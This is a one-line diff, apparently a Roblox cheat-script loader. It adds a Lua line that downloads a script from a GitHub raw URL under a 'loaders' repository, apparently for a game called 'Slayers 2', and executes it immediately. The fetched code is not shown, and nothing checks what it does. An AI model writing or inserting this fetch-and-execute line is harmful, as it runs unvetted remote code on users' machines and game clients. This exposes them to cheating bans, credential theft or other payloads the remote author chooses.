@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/slayers-2-spam0-y7lchrgym8pg0o.lua"))()
